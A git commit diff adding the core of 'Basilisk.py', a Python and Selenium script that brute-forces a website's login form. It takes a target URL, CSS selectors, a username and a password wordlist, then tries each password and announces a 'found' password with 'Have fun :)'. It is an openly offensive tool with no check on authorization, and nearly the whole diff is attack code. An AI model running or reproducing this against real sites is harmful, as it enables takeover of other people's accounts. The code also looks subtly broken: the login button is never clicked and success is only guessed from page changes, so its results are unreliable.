5e34a976afae1bae4805a59dffe7f83b861b2d0d
Krypt0c <58837465+Krypt0c@users.noreply.github.com>
2021-06-21 23:51:03 -0600

    Update Basilisk.py

--- Basilisk.py
+++ Basilisk.py
@@ -24,3 +24,93 @@ parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button s
 parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
+
+
+def wizard():
+    print (banner)
+    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
+    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
+    sys.stdout.flush()
+    t.sleep(1)
+    try:
+        request = requests.get(website)
+        if request.status_code == 200:
+            print (color.GREEN + '[OK]'+color.CWHITE)
+            sys.stdout.flush()
+    except selenium.common.exceptions.NoSuchElementException:
+        pass
+    except KeyboardInterrupt:
+        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
+        exit()
+    except:
+        t.sleep(1)
+        print (color.RED + '[X]'+color.CWHITE)
+        t.sleep(1)
+        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
+        exit()
+
+    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
+    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
+    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
+    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to your pass list: ')
+    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+
+def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
+    f = open(pass_list, 'r')
+    optionss = webdriver.ChromeOptions()
+    optionss.add_argument("--disable-popup-blocking")
+    optionss.add_argument("--disable-extensions")
+    browser = webdriver.Chrome(chrome_options=optionss)
+    wait = WebDriverWait(browser, 10)
+    while True:
+        try:
+            for line in f:
+                browser.get(website)
+                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
+                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
+                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
+                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                Sel_user.send_keys(username)
+                Sel_pas.send_keys(line)
+                print ('------------------------')
+                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
+                print ('------------------------')
+        except KeyboardInterrupt: #returns to main menu if ctrl C is used
+            print('CTRL C')
+            break
+        except selenium.common.exceptions.NoSuchElementException:
+            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+            print ('LAST PASS ATTEMPT BELLOW')
+            print (color.GREEN + 'Password has been found: {0}'.format(line))
+            print (color.YELLOW + 'Have fun :)')
+            exit()
+
+banner = color.BOLD + color.RED +'''
+  _    _       _       _
+ | |  | |     | |     | |
+ | |__| | __ _| |_ ___| |__
+ |  __  |/ _` | __/ __| '_ \\
+ | |  | | (_| | || (__| | | |
+ |_|  |_|\__,_|\__\___|_| |_|
+  {0}[{1}-{2}]--> {3}V.1.0
+  {4}[{5}-{6}]--> {7}coded by Metachar
+  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
+
+if options.username == None:
+    if options.usernamesel == None:
+        if options.passsel == None:
+            if options.loginsel == None:
+                if options.passlist == None:
+                    if options.website == None:
+                        wizard()
+
+
+username = options.username
+username_selector = options.usernamesel
+password_selector = options.passsel
+login_btn_selector = options.loginsel
+website = options.website
+pass_list = options.passlist
+print (banner)
+brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
